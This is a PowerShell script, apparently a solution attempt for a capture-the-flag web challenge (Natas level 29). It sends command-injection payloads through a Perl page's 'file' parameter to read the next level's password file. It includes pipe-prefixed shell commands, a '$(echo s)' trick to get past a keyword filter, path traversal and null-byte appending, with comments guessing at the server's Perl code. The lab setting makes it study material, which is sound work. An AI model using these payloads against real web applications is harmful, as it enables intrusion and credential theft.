param (
    [Parameter(Mandatory=$true)]
    [string]$server,
    [Parameter(Mandatory=$true)]
    [string]$username,
    [Parameter(Mandatory=$true)]
    [string]$password
)
$url = $server

$pair = "${username}:${password}"
$bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
$base64 = [System.Convert]::ToBase64String($bytes)
$authorization = "Basic $base64"

$headers = @{
    "Authorization" = $authorization
    "Content-Type"  = "application/x-www-form-urlencoded"
} 

#characters ignored by UNIX file system 
<#
index.pl?file=|echo nata$(echo s)%00
open(FH, "|echo natas$(echo s)%00")
|cat /etc/nata$(echo s)_webpass/nata$(echo s)30%00
index.pl?file=|echo nata$(echo s)%00
index.pl?file=|echo nata$(echo s)%00
index.pl?file=|echo nata$(echo s)%00



$filename = 'weirdfile';
$filepathiwant = '../../../some/path/' + $filename;
    #$'filename' is being stringcompared, and aborts the process 

perl code: (possibilities)

  open (STATFILE, "<$myinput"); #  open (STATFILE, "</usr/stats/$username");

--------

if ($input =~ "natas") {
    #ABORT/EXIT/WHATEVER
} else {
    $filename = $input + '.pl'; #<- maybe it appends a thing or not idk
}
open (handle, $filename)

#>

<#

sub 

#>

$url += '/index.pl?file='


# 'natas'-keyword BLOCKED by server for $file argument
#       $param = '../../../../../../etc/natas'
# ../ is ok:
#       $param = '../../'

$nullbyte = '%00' #<- URL Encoded
#$param = "../../../../../../etc/nata${nullbyte}s_webpass/nata${nullbyte}s30"
#$param = "../../../../../../etc/nata${bla}s_webpass/nata${bla}s30"
#$param = "%00natas%00"
$param = '|cat /etc/nata$(echo s)_webpass/nata$(echo s)30'
$param = '|cat index.pl'
$param = '|cat "perl underground 2.txt"'
#/var/www/natas/natas29/index.pl
$param += $nullbyte
$param
$url += $param;

$response = Invoke-WebRequest -Headers $headers -URI $url
$response.Content

if ($response.Content -like '*meeeeeep!*') {
    $msg = "FALSE"
} else {
    $msg = "maybe right"
}

write-host `n$msg`n